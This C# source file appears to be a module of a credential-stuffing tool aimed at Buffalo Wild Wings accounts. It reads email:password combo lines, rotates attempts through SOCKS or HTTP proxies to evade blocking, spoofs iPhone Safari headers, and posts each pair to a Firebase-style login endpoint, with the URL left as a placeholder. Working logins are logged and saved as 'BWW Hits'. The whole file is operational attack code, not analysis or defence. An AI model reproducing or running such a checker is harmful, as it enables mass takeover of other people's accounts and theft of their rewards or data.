using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Brute
{
    class buffalowildwings
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("Host", "www.googleapis.com");
                httpRequest.AddHeader("Content-Type", "application/json");
                httpRequest.AddHeader("Origin", "https://www.buffalowildwings.com");
                httpRequest.AddHeader("X-Client-Version", "Safari/JsCore/8.3.0/FirebaseCore-web");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1");
                httpRequest.AddHeader("Referer", "https://www.buffalowildwings.com/");
                httpRequest.AddHeader("Accept-Language", "en-us");
                string str1 = httpRequest.Post("URL HERE", "{\"email\":\"" + strArray1[0] + "\",\"password\":\"" + strArray1[1] + "\",\"returnSecureToken\":true}", "application/json").ToString();
                if (str1.Contains("idToken") || str1.Contains("refreshToken"))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo}", Color.Green);
                    }
                    Program.Save(combo, "BWW Hits");
                    return true;
                }
                else if (str1.Contains("EMAIL_NOT_FOUND") || str1.Contains("INVALID_PASSWORD"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    ////Program.Save(combo, "Invalids");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }

            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
